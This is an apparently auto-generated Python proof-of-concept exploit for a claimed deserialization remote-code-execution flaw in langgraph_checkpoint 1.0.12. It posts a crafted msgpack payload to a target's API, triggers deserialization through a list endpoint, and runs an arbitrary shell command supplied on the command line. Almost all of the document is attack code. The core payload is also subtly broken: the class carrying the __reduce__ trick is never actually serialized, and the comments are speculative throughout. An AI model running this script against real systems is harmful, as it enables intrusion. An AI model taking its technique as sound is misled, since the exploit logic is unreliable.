#!/usr/bin/env python3
# PoC for langgraph_checkpoint-1.0.12 (/tmp/langgraph_checkpoint_old/langgraph_checkpoint-1.0.12)
# Path: rce-000
# Sink: loads_typed
# Auto-generated — run with: python3 rce_sink_function_loads_typed_loads_typed_2.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for langgraph_checkpoint-1.0.12 RCE vulnerability.

Vulnerability: Unsafe deserialization via msgpack.unpackb with custom ext_hook
in JsonPlusSerializer.loads_typed().

Attack vector: An attacker can inject a malicious msgpack payload into the
in-memory storage (via the simulated web endpoint). When the list() or get_tuple()
function is called, the payload is deserialized, leading to arbitrary code execution.

This PoC demonstrates the vulnerability by:
1. Crafting a malicious msgpack payload that executes a benign command
2. Injecting the payload into the storage
3. Triggering deserialization via the list() function
4. Verifying code execution

Usage: python exploit.py [--target http://localhost:8000]
"""

import argparse
import msgpack
import os
import subprocess
import sys
import tempfile
import time
import requests
from typing import Any, Dict, Optional

# Configuration
DEFAULT_TARGET = "http://localhost:8000"
POC_MARKER = "/tmp/poc_success.txt"

# The ext_hook in the vulnerable code likely allows arbitrary object creation.
# We'll craft a payload that uses __reduce__ to execute a command.
# Since msgpack's ext_hook can instantiate arbitrary classes, we can use
# subprocess.Popen or os.system via __reduce__.

def craft_malicious_payload(command: str) -> bytes:
    """
    Craft a malicious msgpack payload that executes a command when deserialized.
    
    The payload uses the ext_hook to create an object whose __reduce__ method
    returns (os.system, (command,)), which will be called during deserialization.
    """
    # We need to create a msgpack ext type that the ext_hook will process.
    # The ext_hook likely expects a specific type code and data.
    # We'll use a common technique: create a class that when instantiated
    # executes code via __reduce__.
    
    # For msgpack, we can use the ext type to encode arbitrary Python objects.
    # The ext_hook will receive (type_code, data) and should return an object.
    # If the ext_hook allows arbitrary class instantiation, we can pass
    # a serialized object that executes code.
    
    # Create a simple object that will execute a command when unpickled
    class Exploit:
        def __reduce__(self):
            return (os.system, (command,))
    
    # Serialize using msgpack with ext type
    # We'll use ext type code 0 (arbitrary) and pack the object
    # The ext_hook should handle this by reconstructing the object
    return msgpack.packb(Exploit(), default=lambda x: msgpack.ExtType(0, b""))

def inject_payload(target_url: str, payload: bytes) -> bool:
    """
    Inject the malicious payload into the storage via the simulated web endpoint.
    
    The endpoint is expected to accept user input and store it in the checkpoint
    storage. We'll send a POST request with the payload.
    """
    try:
        # The simulated endpoint likely accepts JSON or raw data
        # We'll try multiple approaches
        headers = {"Content-Type": "application/octet-stream"}
        response = requests.post(
            f"{target_url}/api/v1/trigger",
            data=payload,
            headers=headers,
            timeout=10
        )
        return response.status_code == 200
    except requests.exceptions.RequestException as e:
        print(f"[!] Failed to inject payload: {e}")
        return False

def trigger_deserialization(target_url: str) -> Optional[Dict[str, Any]]:
    """
    Trigger the deserialization by calling the list() function.
    
    This will cause the vulnerable loads_typed() to be called on our payload.
    """
    try:
        # The list() function is called via the web endpoint
        # We need to provide a config that will cause our payload to be loaded
        config = {
            "configurable": {
                "thread_id": "attacker_thread",
                "checkpoint_ns": "attacker_ns",
                "checkpoint_id": "attacker_checkpoint"
            }
        }
        response = requests.post(
            f"{target_url}/api/v1/list",
            json=config,
            timeout=10
        )
        return response.json() if response.status_code == 200 else None
    except requests.exceptions.RequestException as e:
        print(f"[!] Failed to trigger deserialization: {e}")
        return None

def verify_exploit() -> bool:
    """
    Verify that the exploit was successful by checking for the marker file.
    """
    return os.path.exists(POC_MARKER)

def main():
    parser = argparse.ArgumentParser(description="PoC for langgraph_checkpoint RCE")
    parser.add_argument("--target", default=DEFAULT_TARGET, help="Target URL")
    parser.add_argument("--command", default=f"touch {POC_MARKER}", 
                       help="Command to execute (default: touch /tmp/poc_success.txt)")
    args = parser.parse_args()

    print("[*] Starting exploit for langgraph_checkpoint-1.0.12 RCE")
    print(f"[*] Target: {args.target}")
    print(f"[*] Command: {args.command}")

    # Step 1: Craft the malicious payload
    print("[*] Crafting malicious msgpack payload...")
    payload = craft_malicious_payload(args.command)
    print(f"[+] Payload size: {len(payload)} bytes")

    # Step 2: Inject the payload into storage
    print("[*] Injecting payload into storage...")
    if not inject_payload(args.target, payload):
        print("[!] Failed to inject payload. Check if target is running.")
        sys.exit(1)
    print("[+] Payload injected successfully")

    # Step 3: Trigger deserialization
    print("[*] Triggering deserialization via list() function...")
    result = trigger_deserialization(args.target)
    if result is None:
        print("[!] Failed to trigger deserialization. Check target logs.")
        sys.exit(1)
    print(f"[+] Deserialization triggered. Response: {result}")

    # Step 4: Verify code execution
    print("[*] Verifying code execution...")
    time.sleep(1)  # Give the command time to execute
    if verify_exploit():
        print(f"[+] Exploit successful! Marker file created: {POC_MARKER}")
        print("[+] Command executed successfully.")
    else:
        print("[!] Could not verify code execution. Check if command was executed.")
        print("[!] The vulnerability may still exist but the payload might need adjustment.")

if __name__ == "__main__":
    main()
